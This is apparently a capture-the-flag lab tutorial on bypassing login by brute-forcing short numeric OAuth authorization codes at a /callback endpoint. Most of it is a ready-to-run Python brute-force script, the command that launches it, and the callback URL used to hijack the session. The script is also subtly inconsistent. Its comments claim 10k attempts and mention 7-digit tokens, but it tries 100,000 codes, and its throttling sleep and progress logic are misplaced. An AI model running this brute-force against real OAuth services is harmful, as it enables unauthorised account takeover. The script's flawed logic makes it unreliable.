This attack happens when token used by OAuth are weak and can be bruteforced. This could happens for example if backend issues token max 5 digits
long with no chars in it!

# Case Scenario
You have again 2 sites the first that let's you register/login with a user and then upload some files. The second website is used to delete files from the first one, it engages a OAuth SSO authentication to perform a seamless 
authentication between the 2 websites.

### How to attack
When you accept the request from the second website, and and pass the OAuth authorization code you will see the token is 5 numbers long with no strings:
```
GET /callback?code=70398 HTTP/1.1
Host: deletedocs.htb.net
```
1) You can implement this that bruteforce up to 10k and guess the token used, it also implements a sleep function to bypass the throttling over wrong tentative:
```
import requests, sys, time

def brute():
    try:
        #Adjust if token is more than 7 number long
        value = range(100000)
        for val in value:
            url = sys.argv[1]
            #adjust with the right URL for the OAuth token
            r = requests.get(url + '/callback?code='+str(val))
            #Adjust the error message to match
            if "Forbidden" not in r.text:
                print(" Number found!", val)
                #Avoid throttling by adding a sleep
                time.sleep(20)
            elif r.status_code == 200:
                sys.stdout.write(u"\u001b[1000D")  # Move all the way left
                sys.stdout.write("Tring: " + str(val))
                sys.stdout.flush()
    except IndexError:
        print("Enter a URL E.g.: http://<lab-ip>")
		
brute()
```
2) And call it(do not add the / at the end of the URL):
```
python3 filename.py http://deletedocs.htb.net 
```
3) When token is found then you can bypass the login(if you get **cookie.sid** then you are Gucci!): http://deletedocs.htb.net/callback?code={code}
